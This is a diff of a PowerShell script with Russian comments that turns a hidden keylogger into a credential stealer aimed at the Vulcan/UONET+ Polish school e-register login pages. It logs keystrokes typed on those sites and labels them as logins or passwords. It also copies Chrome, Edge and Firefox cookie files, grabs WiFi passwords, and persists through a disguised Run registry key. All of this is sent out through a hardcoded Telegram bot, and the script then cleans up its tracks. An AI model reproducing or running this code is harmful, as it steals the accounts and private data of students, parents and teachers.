@@ -20,17 +20,33 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПОИСКА
+# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
 $keyloggerStatus = "Starting..."
 
-# Создаем улучшенный кейлоггер для поиска
+# Создаем улучшенный кейлоггер
 $keyloggerScript = @"
 Add-Type -AssemblyName System.Windows.Forms
 
+# Список целевых сайтов Вулкан
+`$vulcanUrls = @(
+    "*vulcan*",
+    "*uonetplus*", 
+    "*dziennik*",
+    "*edu.gdynia*",
+    "*eszkola.opolskie.pl*",
+    "*cufs.vulcan.net.pl*",
+    "*dziennik-logowanie.vulcan.net.pl*",
+    "*Account/LogOn*"
+)
+
 `$capturedData = @()
 `$currentWindow = ""
-`$searchBuffer = ""
-`$lastSearch = ""
+`$buffer = ""
+`$isVulcanSite = `$false
+`$loginField = `$false
+`$passwordField = `$false
+`$loginData = ""
+`$passwordData = ""
 
 function Send-ToTelegram {
     param(`$message)
@@ -43,12 +59,29 @@ function Send-ToTelegram {
     } catch { }
 }
 
-function Process-Search {
-    if(`$searchBuffer -ne "" -and `$searchBuffer -ne `$lastSearch) {
-        Send-ToTelegram "🔍 SEARCH DETECTED: `$searchBuffer"
-        `$lastSearch = `$searchBuffer
-        `$capturedData += "SEARCH: `$searchBuffer"
-        `$searchBuffer = ""
+function Process-Buffer {
+    if(`$buffer -ne "") {
+        # Определяем тип данных по контексту
+        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
+            `$loginData = `$buffer
+            Send-ToTelegram "🔑 VULCAN LOGIN: `$loginData"
+        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
+            `$passwordData = `$buffer
+            Send-ToTelegram "🔒 VULCAN PASSWORD: `$passwordData"
+            
+            # Если есть и логин и пароль - отправляем вместе
+            if(`$loginData -ne "" -and `$passwordData -ne "") {
+                Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$loginData`nPassword: `$passwordData"
+                `$loginData = ""
+                `$passwordData = ""
+            }
+        } else {
+            # Отправляем обычные данные
+            Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
+        }
+        
+        `$capturedData += `$buffer
+        `$buffer = ""
     }
 }
 
@@ -61,24 +94,30 @@ while(`$true) {
             `$activeWindow = `$processes[0].MainWindowTitle
         }
         
-        # Определяем поисковые системы и поля поиска
-        `$isSearchContext = `$false
-        if(`$activeWindow -like "*google*" -or 
-           `$activeWindow -like "*yandex*" -or 
-           `$activeWindow -like "*bing*" -or 
-           `$activeWindow -like "*search*" -or
-           `$activeWindow -like "*поиск*" -or
-           `$activeWindow -match "браузер" -or
-           `$activeWindow -like "*chrome*" -or
-           `$activeWindow -like "*firefox*" -or
-           `$activeWindow -like "*edge*" -or
-           `$activeWindow -like "*opera*" -or
-           `$activeWindow -like "*safari*") {
-            `$isSearchContext = `$true
+        # Проверяем активное окно на наличие сайтов Вулкан
+        `$siteDetected = `$false
+        foreach(`$url in `$vulcanUrls) {
+            if(`$activeWindow -like `$url) {
+                `$siteDetected = `$true
+                break
+            }
         }
         
-        # Перехватываем нажатия клавиш в поисковом контексте
-        if(`$isSearchContext) {
+        if(`$siteDetected) {
+            if(!`$isVulcanSite) {
+                `$isVulcanSite = `$true
+                Send-ToTelegram "🎯 USER OPENED VULCAN SITE:`n`$activeWindow"
+            }
+        } else {
+            if(`$isVulcanSite) {
+                `$isVulcanSite = `$false
+                Process-Buffer
+                Send-ToTelegram "📱 USER LEFT VULCAN SITE"
+            }
+        }
+        
+        # Перехватываем нажатия клавиш только на сайтах Вулкан
+        if(`$isVulcanSite) {
             for(`$i = 8; `$i -lt 255; `$i++) {
                 `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                 if(`$keyState -eq -32767) {
@@ -87,26 +126,27 @@ while(`$true) {
                     # Обрабатываем специальные клавиши
                     switch(`$key) {
                         "Enter" { 
-                            Process-Search
+                            Process-Buffer
                         }
                         "Space" { 
-                            `$searchBuffer += " " 
+                            `$buffer += " " 
                         }
                         "Back" { 
-                            if(`$searchBuffer.Length -gt 0) { 
-                                `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
+                            if(`$buffer.Length -gt 0) { 
+                                `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
                             }
                         }
                         "Tab" { 
-                            `$searchBuffer += "[TAB]"
+                            `$buffer += "[TAB]"
+                            Process-Buffer
                         }
                         "LButton" { 
-                            # Клик мыши - обрабатываем поиск
-                            Process-Search
+                            # Клик мыши - обрабатываем буфер
+                            Process-Buffer
                         }
                         "RButton" { 
-                            # Правый клик - обрабатываем поиск
-                            Process-Search
+                            # Правый клик - обрабатываем буфер
+                            Process-Buffer
                         }
                         default {
                             # Обрабатываем обычные символы
@@ -116,82 +156,42 @@ while(`$true) {
                                 `$isCaps = [System.Windows.Forms.Console]::CapsLock
                                 
                                 if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                                    `$searchBuffer += `$key.ToString()
+                                    `$buffer += `$key.ToString()
                                 } else {
-                                    `$searchBuffer += `$key.ToString().ToLower()
+                                    `$buffer += `$key.ToString().ToLower()
                                 }
                             } elseif(`$key -ge 48 -and `$key -le 57) {
                                 # Цифры 0-9
                                 `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                 `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                                 if(`$isShift) {
-                                    `$searchBuffer += `$symbols[`$key - 48]
+                                    `$buffer += `$symbols[`$key - 48]
                                 } else {
-                                    `$searchBuffer += (`$key - 48).ToString()
+                                    `$buffer += (`$key - 48).ToString()
                                 }
                             } elseif(`$key -eq 190 -or `$key -eq 110) {
                                 # Точка
-                                `$searchBuffer += "."
+                                `$buffer += "."
                             } elseif(`$key -eq 189 -or `$key -eq 109) {
                                 # Минус/дефис
-                                `$searchBuffer += "-"
+                                `$buffer += "-"
                             } elseif(`$key -eq 187 -or `$key -eq 107) {
                                 # Плюс/равно
                                 `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                 if(`$isShift) {
-                                    `$searchBuffer += "+"
+                                    `$buffer += "+"
                                 } else {
-                                    `$searchBuffer += "="
-                                }
-                            } elseif(`$key -eq 186 -or `$key -eq 59) {
-                                # Точка с запятой/двоеточие
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$searchBuffer += ":"
-                                } else {
-                                    `$searchBuffer += ";"
-                                }
-                            } elseif(`$key -eq 222) {
-                                # Кавычки/апостроф
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$searchBuffer += "`""
-                                } else {
-                                    `$searchBuffer += "'"
-                                }
-                            } elseif(`$key -eq 188 -or `$key -eq 108) {
-                                # Запятая
-                                `$searchBuffer += ","
-                            } elseif(`$key -eq 191 -or `$key -eq 111) {
-                                # Слеш/вопрос
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$searchBuffer += "?"
-                                } else {
-                                    `$searchBuffer += "/"
-                                }
-                            } elseif(`$key -eq 220) {
-                                # Обратный слеш/вертикальная черта
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$searchBuffer += "|"
-                                } else {
-                                    `$searchBuffer += "\"
+                                    `$buffer += "="
                                 }
                             }
                         }
                     }
                     
-                    # Автоматически отправляем длинные поисковые запросы
-                    if(`$searchBuffer.Length -gt 30) {
-                        Process-Search
+                    # Автоматически отправляем длинные вводы
+                    if(`$buffer.Length -gt 50) {
+                        Process-Buffer
                     }
                 }
-            }
-        } else {
-            # Если вышли из поискового контекста - обрабатываем оставшийся буфер
-            if(`$searchBuffer -ne "" -and `$searchBuffer -ne `$lastSearch) {
-                Process-Search
             }
         }
     } catch { }
@@ -201,23 +201,61 @@ while(`$true) {
 
 # Сохраняем и запускаем улучшенный кейлоггер
 try {
-    $keyloggerScript | Out-File "$env:TEMP\search_logger.ps1" -Encoding ASCII
-    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`"" -WindowStyle Hidden
+    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger.ps1" -Encoding ASCII
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`"" -WindowStyle Hidden
     
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`""
-    Set-ItemProperty -Path $startupPath -Name "SearchMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
+    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`""
+    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ Advanced search logger active - monitoring all search queries"
+    $keyloggerStatus = "✅ Advanced keylogger active - monitoring Vulcan sites"
 } catch {
-    $keyloggerStatus = "❌ Search logger failed: $($_.Exception.Message)"
+    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
 }
 
 # Безопасность
 try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
 try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
 try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}
+
+# Cookies - создаем ZIP архив для удобной загрузки
+$cookies = @()
+$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
+$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"
+
+New-Item -ItemType Directory -Path $temp -Force | Out-Null
+
+# Копируем файлы cookies
+$browsers = @(
+    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
+    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
+    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
+)
+
+foreach ($browser in $browsers) {
+    if ($browser.Path -and (Test-Path $browser.Path)) {
+        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
+        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
+        if (Test-Path $dest) {
+            $cookies += $dest
+            # Создаем текстовую информацию о файле
+            $fileInfo = Get-Item $dest
+            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
+            $cookies += "$temp\$($browser.Name)_info.txt"
+        }
+    }
+}
+
+# Создаем ZIP архив с cookies
+try {
+    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
+        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
+        if (Test-Path $zipPath) {
+            $cookies += $zipPath
+        }
+    }
+} catch {}
 
 # Дополнительная информация
 try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
@@ -257,8 +295,17 @@ $conn
 === WIFI PASSWORDS ===
 $wifi
 
-=== SEARCH LOGGER STATUS ===
+=== KEYLOGGER STATUS ===
 $keyloggerStatus
+
+=== TARGET SITES ===
+• https://cufs.vulcan.net.pl/minrol/Account/LogOn
+• Все сайты Vulcan/UONET+
+• Страницы входа в дневник
+
+=== BROWSER COOKIES ===
+Found cookies files: $($cookies.Count)
+Files available for download as ZIP archive
 
 === SECURITY STATUS ===
 Firewall: 
@@ -274,3 +321,40 @@ Uptime: $uptimeInfo
 "@
 
 Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
+
+# Отправка ZIP архива с cookies
+if (Test-Path $zipPath) {
+    try {
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
+            chat_id = '5674514050'
+            document = [System.IO.File]::OpenRead($zipPath)
+            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
+        }
+    } catch {
+        # Если не удалось отправить ZIP, отправляем файлы по отдельности
+        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
+            try {
+                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
+                    chat_id = '5674514050'
+                    document = [System.IO.File]::OpenRead($_)
+                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
+                }
+            } catch {}
+        }
+    }
+} else {
+    # Отправка отдельных файлов если ZIP не создался
+    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
+        try {
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
+                chat_id = '5674514050'
+                document = [System.IO.File]::OpenRead($_)
+                caption = "Cookies file: $(Split-Path $_ -Leaf)"
+            }
+        } catch {}
+    }
+}
+
+# Очистка
+Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
